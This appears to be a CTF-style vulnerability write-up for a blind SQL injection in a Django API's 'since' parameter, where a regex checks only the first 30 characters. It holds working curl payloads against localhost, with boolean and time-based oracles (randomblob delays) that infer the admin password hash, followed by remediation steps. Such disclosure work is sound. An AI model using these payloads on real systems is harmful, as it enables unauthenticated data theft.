# Description

**Vulnerability:** Blind SQL Injection via the `since` parameter of `GET /api/css/marketplace-stats/` (regex bypass, time-based and boolean-based)

**CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command, "SQL Injection")

**Affected code:** `djangoWocshack_5/Api/views.py`, function `marketplace_stats()` (defined at line 3776)

```python
# djangoWocshack_5/Api/views.py
3787    since = request.GET.get('since', '').strip()
...
3796    if since:
3797        if _re.match(r'^[\d\-]+$', since[:30]):           # validates only the first 30 chars
3798            conditions.append(f"created_at > '{since}'") # full value interpolated raw
...
3800    where = " AND ".join(conditions)
...
3804            cur.execute(f"""
3805                SELECT COUNT(*) AS total, ...
3809                FROM Api_css
3810                WHERE {where}
3811            """)
...
3818    except Exception:
3819        return api_success({"total": 0, "free": 0, "paid": 0})
```

The route is registered in `djangoWocshack_5/Api/urls.py` (`path("css/marketplace-stats/", views.marketplace_stats, ...)`). The OpenAPI schema also lists the endpoint and its `since` parameter, described as "ISO date — only files created after this date". Therefore, the parameter is documented in this build, although the endpoint is not linked from the UI.

The endpoint requires no authentication (`@require_GET` only, no `@api_auth_required`).

**Root cause.** The developer intended the `since` value to be a date string, and wrote a regex check to enforce that. The check, however, runs against `since[:30]`, i.e. only the first 30 characters, while the f-string interpolates the entire value into the SQL text. Any input whose first 30 characters are digits or hyphens passes the check, and everything from character 31 onward is attacker-controlled SQL.

**Regex-bypass pattern.** The 30-character prefix satisfies `^[\d\-]+$`, and the rest closes the SQL string literal, injects a boolean predicate, and comments out the trailing quote:

```text
since = <30 chars of [0-9-]>' AND (<injection>) --
        └──── passes regex ───┘ └──── injected after char 30 ────┘

Rendered SQL:
  WHERE is_active = 1 AND created_at > '2000-01-01-0000000000000000000' AND (<injection>) --'
```

Because the regex never sees character 31 onward, the quote and `--` are never validated. The quote at position 31 terminates the original string literal, and `--` comments out the original closing quote.

**Why it is hard to find.** Although the endpoint and parameter are documented in OpenAPI, they are not exposed through the application UI. Testers focusing only on common search parameters such as `q`, `search`, or `filter` may overlook `since`. The regex creates a false sense of safety, and the endpoint does not expose SQL errors: the `try/except` converts database exceptions into a valid-looking zero-count response.

**Oracles.** Two side channels are available:

1. **Time (primary).** When the injected predicate is true, SQLite evaluates a computationally expensive expression using `SUM(length(randomblob(1000000)))` over `Api_css`. When false, the expensive branch is skipped. On the tested local instance, TRUE responses took approximately 490–500 ms, compared with approximately 6–10 ms for FALSE responses.
2. **Body (secondary).** The injected predicate also controls the outer `WHERE` condition. When true, the JSON response contains the matching CSS counts; when false, the counts are zero. The response body therefore provides a boolean oracle without relying on timing.

SQLite does not provide a built-in `SLEEP()` function. The PoC uses `randomblob()` to create an observable delay.

**Important:** The `LIMIT 50` in the original aggregate subquery does not limit the number of rows processed by `SUM()`. It limits the number of result rows returned after aggregation. The actual workload and delay therefore depend on the number of rows processed by the query, rather than being capped at 50 rows.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Discover `/api/css/marketplace-stats/` through the API schema or source code and inspect its `since` parameter. | `since` is interpolated into SQL after a regex check on only `since[:30]`. |
| 2 | Send a plain payload `since=foo'` to confirm the regex rejects it. | The regex fails on the first character, so `since` is ignored and the unfiltered count is returned. |
| 3 | Send `2000-01-01-0000000000000000000' AND 1=1 --`. | The regex passes on the prefix. The TRUE condition preserves the matching CSS count. |
| 4 | Send the same prefix with `AND 1=2 --`. | The FALSE condition produces zero results, confirming boolean control over the SQL query. |
| 5 | Use a time-gated subquery to check whether the `admin` user exists. | The TRUE condition evaluates the expensive `randomblob()` expression, causing an observable delay. |
| 6 | Repeat the test with a nonexistent username (`nobody`). | The FALSE condition skips the expensive expression, confirming the timing difference. |
| 7 | Test a character of a database value with `SUBSTR()`, e.g. the first character of the admin password hash. | A matching predicate produces the TRUE response delay. |
| 8 | Repeat character comparisons to infer additional database values. | Demonstrates the potential for blind data extraction from tables accessible to the application database connection. |

# PoC

All requests are unauthenticated `GET` requests. The `-w "%{time_total}"` option prints the response time in seconds.

The `--` sequence comments out the original closing quote. The first 30 characters (`2000-01-01-0000000000000000000`) contain only digits and hyphens, allowing the regex check to pass.

**1. Regex bypass, boolean body oracle (confirms injection)**

```bash
# Injected predicate TRUE -> matching CSS count returned
curl -s "http://localhost:8000/api/css/marketplace-stats/?since=2000-01-01-0000000000000000000'%20AND%201=1%20--"
# {"success":true,"data":{"total":305,"free":27,"paid":278}}

# Injected predicate FALSE -> zero rows
curl -s "http://localhost:8000/api/css/marketplace-stats/?since=2000-01-01-0000000000000000000'%20AND%201=2%20--"
# {"success":true,"data":{"total":0,"free":0,"paid":0}}
```

The counts above were observed on the local test instance and may differ depending on the seeded data.

**2. Time-based blind oracle: does user `admin` exist?**

```bash
# TRUE branch: admin exists -> ~500 ms
curl -s -o /dev/null -w "%{time_total}\n" \
  "http://localhost:8000/api/css/marketplace-stats/?since=2000-01-01-0000000000000000000'%20AND%20(SELECT%20CASE%20WHEN%20(SELECT%20COUNT(*)%20FROM%20auth_user%20WHERE%20username='admin')%3E0%20THEN%20(SELECT%20SUM(length(randomblob(1000000)))%20FROM%20Api_css%20LIMIT%2050)%20ELSE%200%20END)%3E0%20--"

# FALSE branch: no such user -> ~10 ms
curl -s -o /dev/null -w "%{time_total}\n" \
  "http://localhost:8000/api/css/marketplace-stats/?since=2000-01-01-0000000000000000000'%20AND%20(SELECT%20CASE%20WHEN%20(SELECT%20COUNT(*)%20FROM%20auth_user%20WHERE%20username='nobody')%3E0%20THEN%20(SELECT%20SUM(length(randomblob(1000000)))%20FROM%20Api_css%20LIMIT%2050)%20ELSE%200%20END)%3E0%20--"
```

**3. Time-based extraction of the admin password hash, first character**

```bash
# Slow (~500 ms) => the first character of admin's password hash is 'p'
curl -s -o /dev/null -w "%{time_total}\n" -G \
  "http://localhost:8000/api/css/marketplace-stats/" \
  --data-urlencode "since=2000-01-01-0000000000000000000' AND (SELECT CASE WHEN SUBSTR((SELECT password FROM auth_user WHERE username='admin'),1,1)='p' THEN (SELECT SUM(length(randomblob(1000000))) FROM Api_css LIMIT 50) ELSE 0 END)>0 --"
```

The character comparison was reproduced multiple times, with response times consistently around 490–500 ms. Extracting a complete password hash was not necessary to demonstrate the vulnerability.

**Expected results**

| Request | Predicate | Observed time | Response |
|---------|-----------|---------------|----------|
| `AND 1=1` | TRUE | Not measured | `total: 305` |
| `AND 1=2` | FALSE | Not measured | `total: 0` |
| `admin` exists | TRUE | 0.496719 s | Slow response |
| `nobody` exists | FALSE | 0.006426 s | Fast response |
| Admin hash first character = `p` | TRUE | 0.488–0.498 s | Slow response |

These timings are specific to the tested instance. The delay depends on database size, execution environment, and system load. Timing thresholds should be calibrated against both TRUE and FALSE conditions.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | **High.** An unauthenticated attacker can infer values from tables accessible through the application's database connection, including `auth_user` usernames and password hashes. The PoC demonstrates inference of a character from the admin password hash. Full database extraction was not performed. |
| Integrity | **None demonstrated.** The injection occurs in a `SELECT` statement. The tested PoC does not modify database records, and stacked statements are not supported by the demonstrated execution path. |
| Availability | **Low.** The expensive `randomblob()` expression consumes database resources. Repeated requests could degrade application performance, although a sustained denial-of-service impact has not been demonstrated. |

Overall severity: **High** (CVSS 3.1 **7.5**, `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`).

The injection is reachable without authentication and allows blind inference of database values. Once the vulnerable parameter and payload format are known, exploitation does not require special external conditions.

**Challenge difficulty: Very Hard.** Discovering the vulnerable parameter, understanding the partial regex validation, and extracting data through blind inference require significant investigation. This challenge difficulty is separate from the CVSS Attack Complexity metric.

# Remediation

1. **Use a parameterised query, not an f-string.** Bind `since` as a parameter so the SQL text never contains user-controlled SQL syntax:

   ```python
   params = []
   if since:
       conditions.append("created_at > %s")
       params.append(since)

   cur.execute(f"""SELECT ... FROM Api_css WHERE {where}""", params)
   ```

   Django database cursors use `%s` placeholders, including when the underlying database is SQLite.

2. **Parse the value as a date.** Use `datetime.fromisoformat()` or Django's `parse_datetime` / `parse_date` utilities and reject invalid input. Prefer the Django ORM, for example `Css.objects.filter(is_active=True, created_at__gt=since_dt)`, to avoid constructing raw SQL.

3. **Validate the whole value, not a slice.** If a regex is retained, use `re.fullmatch()` against the complete input. Never validate only `since[:30]`.

4. **Handle errors explicitly.** Invalid date input should return an appropriate client error, such as HTTP 400. Unexpected database exceptions should be logged server-side and returned as generic server errors rather than being silently converted into successful zero-count responses.

5. **Limit database access.** Restrict the statistics functionality to the minimum data it requires. With SQLite, table-level user permissions are not available, so stronger isolation requires separating sensitive data or exposing it through appropriately restricted service interfaces.

6. **Keep the API schema accurate and review exposed endpoints.** The endpoint and `since` parameter are already documented in OpenAPI. Ensure that they receive normal security review, and remove `since` if it is not required.

# Author

WOCSA
